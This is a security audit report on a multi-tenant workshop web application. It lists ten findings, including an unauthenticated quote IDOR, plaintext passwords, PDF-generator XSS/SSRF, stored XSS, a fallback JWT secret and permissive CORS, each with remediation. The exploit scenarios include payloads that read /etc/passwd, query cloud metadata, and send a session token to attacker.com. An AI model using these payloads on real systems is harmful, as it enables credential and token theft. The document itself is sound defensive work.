# Security Audit Report: Workshop Application

**Audit Target**: Workshop Fullstack Application (Frontend + Backend)  
**Execution Environment**: Antigravity Native Security Auditor (Independent of Cloudflare)  
**Date**: September 2026  
**Status**: Completed  

---

## Executive Summary

A comprehensive, defense-in-depth security audit of the Workshop application was conducted across authentication, authorization, multi-tenant boundaries, API endpoints, database operations, business logic, and client-side rendering.

The audit identified **10 concrete security findings**:
- 🔴 **Critical Severity**: 3 vulnerabilities
- 🟠 **High Severity**: 4 vulnerabilities
- 🟡 **Medium Severity**: 2 vulnerabilities
- 🟢 **Low Severity**: 1 vulnerability

---

## Vulnerability Summary Table

| ID | Title | Severity | CWE | Location |
|---|---|---|---|---|
| **SEC-01** | Unauthenticated Public Quote Response IDOR (State & Inventory Tampering) | 🔴 Critical | CWE-287 / CWE-639 | `backend/src/routes/quotes.js:744` |
| **SEC-02** | Plaintext Password Storage in PostgreSQL and Redis Cache | 🔴 Critical | CWE-256 / CWE-312 | `backend/src/routes/auth.js:637,795,955` |
| **SEC-03** | Server-Side XSS to SSRF / Local File Read via Puppeteer PDF Generator | 🔴 Critical | CWE-79 / CWE-918 | `backend/src/utils/generateInvoicePdf.js:500` |
| **SEC-04** | Stored Cross-Site Scripting (XSS) in Emails Viewer via Raw HTML Rendering | 🟠 High | CWE-79 | `src/pages/Emails/index.jsx:476` |
| **SEC-05** | Hardcoded Fallback JWT Secret (`dev_secret`) | 🟠 High | CWE-798 / CWE-1188 | `backend/src/middleware/auth.js:11` |
| **SEC-06** | Overly Permissive CORS Configuration with Reflected Origin & Credentials | 🟠 High | CWE-942 | `backend/src/index.js:91-94` |
| **SEC-07** | Excessive Auth Rate Limits (2000 req/15m) & Missing OTP Brute-Force Lockout | 🟠 High | CWE-307 / CWE-799 | `backend/src/middleware/rateLimit.js:13` |
| **SEC-08** | Multi-Tenant Data Leakage via `default-user` Fallback Clause | 🟡 Medium | CWE-284 / CWE-639 | `backend/src/routes/billing.js:50` |
| **SEC-09** | AI Chat Tool `send_email` Functions as Unrestricted SMTP Open Relay | 🟡 Medium | CWE-918 | `backend/src/routes/chat.js:301` |
| **SEC-10** | Missing HTTP Security Headers (No Helmet / CSP / Clickjacking Protection) | 🟢 Low | CWE-693 | `backend/src/index.js` |

---

## Detailed Vulnerability Findings

### 🔴 SEC-01: Unauthenticated Public Quote Response IDOR (State & Inventory Tampering)
- **Severity**: Critical (CVSS 9.1)
- **File**: [`backend/src/routes/quotes.js:744`](file:///c:/Users/91630/Downloads/Workshop-new-features/Workshop/backend/src/routes/quotes.js#L744)
- **Vulnerability**:
  The route `GET /api/quotes/respond` handles public quote acceptance/rejection from email links:
  ```javascript
  router.get('/respond', emailLimiter, async (req, res) => {
    const { id, action } = req.query
    ...
    const quoteRes = await pool.query('SELECT * FROM quotes WHERE id = $1', [id])
  ```
  The endpoint uses sequential integer IDs (`id=1`, `id=2`...) with **no HMAC signature, secret token, or authentication**.
- **Exploit Scenario**:
  An external attacker can script sequential requests (`GET /api/quotes/respond?id=1&action=Accepted`, `?id=2&action=Accepted`...). This force-accepts quotations across **all workshops and tenants**, triggering:
  1. Automated invoice generation in `bills`.
  2. Depletion of product stock in the database (`decreaseProductStockForQuote`).
  3. Execution of automated email/webhook pipelines.
- **Remediation**:
  1. Add a `response_token UUID DEFAULT gen_random_uuid()` column to `quotes` table or sign an HMAC with expiration: `crypto.createHmac('sha256', SECRET).update(`${id}:${action}`).digest('hex')`.
  2. Verify the token on incoming responses: `WHERE id = $1 AND response_token = $2`.

---

### 🔴 SEC-02: Plaintext Password Storage in PostgreSQL and Redis Cache
- **Severity**: Critical (CVSS 9.8)
- **Files**:
  - [`backend/src/routes/auth.js:637`](file:///c:/Users/91630/Downloads/Workshop-new-features/Workshop/backend/src/routes/auth.js#L637) (`/reset-password`)
  - [`backend/src/routes/auth.js:795`](file:///c:/Users/91630/Downloads/Workshop-new-features/Workshop/backend/src/routes/auth.js#L795) (`/register`)
  - [`backend/src/routes/auth.js:955-960`](file:///c:/Users/91630/Downloads/Workshop-new-features/Workshop/backend/src/routes/auth.js#L955) (`/login` caching)
- **Vulnerability**:
  Passwords are stored in cleartext:
  ```javascript
  // Line 637: Reset password updates plaintext password
  await query('UPDATE shop_profiles SET password = $1 WHERE email = $2', [newPassword, email])

  // Line 957: Caching plaintext password in Redis
  redis.set(`pw_cache:${email.toLowerCase()}`, password, { ex: 3600 })
  ```
- **Exploit Scenario**:
  Any unauthorized database read, backup access, or Redis dump directly exposes all users' plaintext credentials.
- **Remediation**:
  1. Hash passwords using `bcrypt` or `argon2` with a minimum cost factor of 10 (`bcrypt.hash(password, 10)`).
  2. Remove cleartext password caching in Redis (`pw_cache`) entirely; rely on standard session JWTs or salted hash verification.

---

### 🔴 SEC-03: Server-Side XSS to SSRF / Local File Read via Puppeteer PDF Generator
- **Severity**: Critical (CVSS 9.3)
- **File**: [`backend/src/utils/generateInvoicePdf.js:500-560`](file:///c:/Users/91630/Downloads/Workshop-new-features/Workshop/backend/src/utils/generateInvoicePdf.js#L500-L560)
- **Vulnerability**:
  User-controlled fields (`customerName`, `companyAddress`, `customerAddress`, `notes`, `docId`) are directly concatenated into the HTML string rendered by Chromium:
  ```javascript
  <div class="addr-name">${customerName || '—'}</div>
  <div class="addr-txt">${companyAddress}</div>
  ```
  Puppeteer is launched with sandbox disabled:
  ```javascript
  args: ['--no-sandbox', '--disable-setuid-sandbox', '--single-process']
  ```
- **Exploit Scenario**:
  An attacker sets their customer name or notes to:
  ```html
  <iframe src="file:///etc/passwd"></iframe>
  ```
  or:
  ```html
  <script>fetch("http://169.254.169.254/latest/meta-data/").then(r=>r.text()).then(t=>document.write(t))</script>
  ```
  When the invoice PDF is generated, Chromium executes the script / renders the file into the PDF document, leaking server files or cloud credentials.
- **Remediation**:
  1. HTML-encode all dynamic parameters before string interpolation (`escapeHtml(customerName)`).
  2. Enable Puppeteer request interception to reject non-HTTP schemes (block `file://`) and block requests to internal private IP ranges (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `169.254.169.254`, `127.0.0.1`).

---

### 🟠 SEC-04: Stored Cross-Site Scripting (XSS) in Emails Viewer
- **Severity**: High (CVSS 8.2)
- **File**: [`src/pages/Emails/index.jsx:476`](file:///c:/Users/91630/Downloads/Workshop-new-features/Workshop/src/pages/Emails/index.jsx#L476)
- **Vulnerability**:
  ```jsx
  <div
    style={{ fontSize: '0.9rem', color: '#374151', lineHeight: 1.6, margin: '0 0 24px' }}
    dangerouslySetInnerHTML={{ __html: selected.body }}
  />
  ```
  Incoming emails fetched from Gmail via IMAP are rendered directly with `dangerouslySetInnerHTML` without HTML sanitization.
- **Exploit Scenario**:
  An attacker sends an email to the workshop's inbox containing `<img src=x onerror="fetch('https://attacker.com/steal?token=' + sessionStorage.getItem('ws_token'))">`. When the workshop admin clicks the email, the script executes in their browser session and exfiltrates their JWT.
- **Remediation**:
  Sanitize with `DOMPurify.sanitize(selected.body)` before rendering.

---

### 🟠 SEC-05: Hardcoded Fallback JWT Secret (`dev_secret`)
- **Severity**: High (CVSS 7.5)
- **Files**:
  - [`backend/src/middleware/auth.js:11`](file:///c:/Users/91630/Downloads/Workshop-new-features/Workshop/backend/src/middleware/auth.js#L11)
  - [`backend/src/routes/auth.js:25`](file:///c:/Users/91630/Downloads/Workshop-new-features/Workshop/backend/src/routes/auth.js#L25)
- **Vulnerability**:
  `const LOCAL_JWT_SECRET = process.env.JWT_SECRET || 'dev_secret'`
- **Exploit Scenario**:
  If `JWT_SECRET` is unset in any staging or production container, an attacker can craft a JWT signed with `dev_secret` for any email/user ID and gain full administrative access.
- **Remediation**:
  Fail fast at startup in production if `!process.env.JWT_SECRET`:
  ```javascript
  if (process.env.NODE_ENV === 'production' && (!process.env.JWT_SECRET || process.env.JWT_SECRET === 'dev_secret')) {
    throw new Error('FATAL: JWT_SECRET environment variable must be set in production.');
  }
  ```

---

### 🟠 SEC-06: Overly Permissive CORS with Reflected Origin & Credentials
- **Severity**: High (CVSS 7.1)
- **File**: [`backend/src/index.js:91-94`](file:///c:/Users/91630/Downloads/Workshop-new-features/Workshop/backend/src/index.js#L91)
- **Vulnerability**:
  ```javascript
  app.use(cors({
    origin: (origin, callback) => callback(null, true),
    credentials: true,
  }))
  ```
- **Exploit Scenario**:
  Any origin is trusted and reflected back. If an authenticated user browses to an untrusted website, that website can execute cross-origin requests to the API.
- **Remediation**:
  Maintain an explicit whitelist of allowed origins (e.g., `process.env.ALLOWED_ORIGINS.split(',')`).

---

### 🟠 SEC-07: Excessive Auth Rate Limits & Missing Per-Email OTP Lockout
- **Severity**: High (CVSS 7.0)
- **Files**:
  - [`backend/src/middleware/rateLimit.js:13`](file:///c:/Users/91630/Downloads/Workshop-new-features/Workshop/backend/src/middleware/rateLimit.js#L13)
  - [`backend/src/routes/auth.js:618-660`](file:///c:/Users/91630/Downloads/Workshop-new-features/Workshop/backend/src/routes/auth.js#L618)
- **Vulnerability**:
  `authLimiter` permits 2,000 requests per 15 minutes. There is no account lockout or attempt counter on `/verify-otp` or `/reset-password` per email.
- **Remediation**:
  1. Reduce `authLimiter` to 30 requests per 15 minutes for `/login` and `/reset-password`.
  2. Limit failed OTP attempts to 5 consecutive failures per email, after which the OTP is invalidated.

---

### 🟡 SEC-08: Multi-Tenant Data Leakage via `default-user` Fallback
- **Severity**: Medium (CVSS 6.5)
- **Files**: `billing.js:50`, `orders.js:57`, `products.js:314`
- **Vulnerability**:
  ```sql
  WHERE (user_id::text = $1::text OR user_id = 'default-user' OR $1 = 'default-user')
  ```
  If `$1` is passed as `'default-user'`, the condition evaluates to `TRUE` for all records across all workshops.
- **Remediation**:
  Remove universal fallback in multi-tenant mode: enforce strict `WHERE user_id = $1`.

---

### 🟡 SEC-09: AI Chat Tool `send_email` Functions as Unrestricted SMTP Open Relay
- **Severity**: Medium (CVSS 5.8)
- **File**: [`backend/src/routes/chat.js:301`](file:///c:/Users/91630/Downloads/Workshop-new-features/Workshop/backend/src/routes/chat.js#L301)
- **Vulnerability**:
  The AI chat tool accepts arbitrary `to` addresses and dispatches emails with no recipient domain verification or customer association check.
- **Remediation**:
  Restrict `send_email` in the chat tool to emails belonging to registered customers, people, or workspace members.

---

### 🟢 SEC-10: Missing HTTP Security Headers
- **Severity**: Low (CVSS 3.7)
- **File**: [`backend/src/index.js`](file:///c:/Users/91630/Downloads/Workshop-new-features/Workshop/backend/src/index.js)
- **Vulnerability**:
  Missing `helmet` middleware. No `X-Frame-Options`, `Content-Security-Policy`, or `X-Content-Type-Options` headers are transmitted.
- **Remediation**:
  Add `helmet()` middleware in `backend/src/index.js`.
